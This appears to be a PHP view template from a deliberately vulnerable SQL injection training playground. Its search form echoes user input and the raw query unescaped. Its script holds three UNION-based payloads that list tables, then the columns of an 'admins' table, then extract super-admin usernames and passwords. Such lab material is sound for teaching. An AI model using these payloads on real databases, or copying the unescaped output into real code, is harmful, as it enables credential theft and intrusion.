

<!-- Subhead
================================================== -->
<header class="jumbotron subhead" id="overview">
  <div class="container">
    <h1>Playgound</h1>
    <h1></h1>
    <p class="lead">
      A1 - Injection
    </p>
  </div>
</header>


<div class="container">

<section>
  
  <form class="form-search" method="POST">
    <input type="text" id="s" name="s" class="input-medium search-query" style="width:90%;" value="<?=$search;?>" />
    <button type="submit" class="btn">Search</button>

    <?php if( $query ){?>
      <p style="margin-top:10px;">
        <h3>Your query:</h3> 
        <?=$query;?>
      </p>
    <?php } ?>

  </form>
  <p class="exploits" id="exploit_1" style="display:none;">
    First we want to list out all the tables so we can find the "Admins" table
    <br />
    SELECT DATABASE() FROM DUAL <== Query to use the currecntly selected database name
  </p>
  <p class="exploits" id="exploit_2" style="display:none;">
    Now that we know the admins Table we want to know what columns there are
  </p>
  <p class="exploits" id="exploit_3" style="display:none;">
    Now that we know the columns lets grab all the Super Admins, cause that sounds fun!
  </p>
  <p class="exploits">
    <a href="#" class="btn" onclick="example_exploit( 1 );" >Exploit #1</a>

    <a href="#" class="btn" onclick="example_exploit( 2 );" >Exploit #2</a>

    <a href="#" class="btn" onclick="example_exploit( 3 );" >Exploit #3</a>
  </p>
  <script>
    function example_exploit( id ){
      var exploit_1 = "0' UNION SELECT table_name, table_name, table_name FROM INFORMATION_SCHEMA.tables WHERE table_schema = ( SELECT DATABASE() FROM DUAL ) AND table_name LIKE '%";
      var exploit_2 = "0' UNION SELECT column_name, column_name, column_name FROM INFORMATION_SCHEMA.columns WHERE table_name = 'admins' AND column_name LIKE '%";
      var exploit_3 = "0' UNION SELECT id, username, password FROM admins WHERE super_admin = '1' AND username LIKE '%";

      $('.exploits').hide();

      if ( id == 1 ){
        $('#s').val( exploit_1 );
        $('#exploit_1').show();
      }else if ( id == 2 ){
        $('#s').val( exploit_2 );
        $('#exploit_2').show();
      }else if ( id == 3 ){
        $('#s').val( exploit_3 );
        $('#exploit_3').show();
      }

    }
  </script>
  <h3>Results</h3>
  
  <table class="table table-striped table-bordered">
    <thead>
      <tr>
        <th>id</th>
        <th>Name</th>
        <th>Date Added (Timestamp)</th>
        <th>Actions</th>
      </tr>
    </thead>
    <?php if($results){ ?>
      <?php foreach($results as $result){?>
        <tr>
          <?php foreach( $result as $value){ ?>
            <td><?= $value;?></td>
          <?php } ?>
          <td style="text-align:center;">
            <a href="#<?=$result->id;?>" class="btn" title="Details">View More</a>
          </td>
        </tr>
      <?php } ?>
    <?php }else{ ?>
      <tr>
        <td colspan="4" style="text-align:center;">No results Found</td>
      </tr>
    <?php } ?>
  </table>
  

</section>


</div>